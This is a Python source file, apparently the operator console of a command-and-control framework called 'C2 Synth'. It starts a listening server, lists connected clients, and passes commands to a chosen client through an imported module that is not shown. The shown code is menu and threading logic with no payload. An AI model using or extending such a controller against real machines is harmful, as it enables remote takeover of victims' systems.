import os
import sys
import time
import click
import itertools
from threading import Thread
from queue import Queue

from synth.Server import Server

HOST: str = "localhost"
PORT: int = 8080

def print_banner() -> None:
    # Print logo.
    click.echo(click.style("""
   _______     ___   _ _______ _    _ 
  / ____\ \   / / \ | |__   __| |  | |
 | (___  \ \_/ /|  \| |  | |  | |__| |
  \___ \  \   / | . ` |  | |  |  __  |
  ____) |  | |  | |\  |  | |  | |  | |
 |_____/   |_|  |_| \_|  |_|  |_|  |_|
                                                     
""", fg="red"))
    click.echo(click.style(f'{" " * 16 + "C2 Synth" + " " * 4}', fg="blue"))
    click.echo(f'\n{" " * 6} Made with {click.style("❤", fg="red")} by Kleo Hasani\n')
    click.echo(f'Host: {click.style(HOST, fg="yellow")}')
    click.echo(f'Port: {click.style(PORT, fg="yellow")}\n')


def print_menu() -> None:
    menu_options: dict[int, str] = {
        1: 'Select client',
        0: 'Exit'
    }

    for key in menu_options.keys():
        click.echo(f'{click.style(key, fg="blue")} | {menu_options[key]}')
    pass



def animate(msg: str, w_time: int = 60) -> None:
    for c in itertools.cycle(["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃", "▁"]):
        if w_time <= 0:
            break
        click.echo(click.style(f'\r{msg} {click.style(c, fg="green")}\r', fg="yellow"), nl=False)
        sys.stdout.flush()
        time.sleep(0.06)
        w_time -= 1
    pass




def start() -> None:
    threads: Queue = Queue()

    server = Server(HOST, PORT)
    server_start: Thread = Thread(target=server.listen)
    server_start.start()

    threads.put(server_start)

    os.system("clear")
    animate("Starting up...")

    os.system("clear")
    print_banner()

    server.show_clients()
    print_menu()


    while True:
        os.system("clear")
        print_banner()
        server.show_clients()
        print_menu()

        option: int = 0
        try:
            option = int(input('\n » '))
        except:
            click.echo(click.style("\nInvalid command.", fg="yellow"))
            time.sleep(1)
            continue

        if option == 1:
            os.system("clear")
            print_banner()
            server.show_clients()
            print_menu()
            
            if len(server.clients) < 1:
                click.echo(click.style("\nNo clients are available...", fg="yellow"))
                time.sleep(1)
                continue

            client_id: int = int(input("\nEnter client number: "))

            os.system("clear")
            print_banner()

            server.send_commands(server.clients[client_id])

            os.system("clear")
            pass
            
        elif option == 0:
            click.echo(click.style("\nShutting down...", fg="yellow"))
            server.kill()
            break
        else:
            click.echo(click.style("\nInvalid command.", fg="yellow"))
            time.sleep(1)
            continue


    # Kill threads.
    while not threads.empty():
        thread: Thread = threads.get()
        thread.join()

    if not server_start.is_alive():
        click.echo(click.style("\nDone", fg="green"))
    pass
    